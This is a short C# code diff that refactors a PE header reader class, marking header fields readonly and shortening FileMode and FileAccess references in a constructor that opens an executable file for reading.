@@ -380,7 +380,7 @@ namespace BlackHole.Slave.Helper.Native.Impl
         /// <summary>
         /// The DOS header
         /// </summary>
-        private IMAGE_DOS_HEADER dosHeader;
+        private readonly IMAGE_DOS_HEADER dosHeader;
         /// <summary>
         /// The file header
         /// </summary>
@@ -388,15 +388,15 @@ namespace BlackHole.Slave.Helper.Native.Impl
         /// <summary>
         /// Optional 32 bit file header 
         /// </summary>
-        private IMAGE_OPTIONAL_HEADER32 optionalHeader32;
+        private readonly IMAGE_OPTIONAL_HEADER32 optionalHeader32;
         /// <summary>
         /// Optional 64 bit file header 
         /// </summary>
-        private IMAGE_OPTIONAL_HEADER64 optionalHeader64;
+        private readonly IMAGE_OPTIONAL_HEADER64 optionalHeader64;
         /// <summary>
         /// Image Section headers. Number of sections is in the file header.
         /// </summary>
-        private IMAGE_SECTION_HEADER[] imageSectionHeaders;
+        private readonly IMAGE_SECTION_HEADER[] imageSectionHeaders;
 
         #endregion Private Fields
 
@@ -405,7 +405,7 @@ namespace BlackHole.Slave.Helper.Native.Impl
         public PeHeaderReader(string filePath)
         {
             // Read in the DLL or EXE and get the timestamp
-            using (var stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
+            using (var stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
             {
                 var reader = new BinaryReader(stream);
                 dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
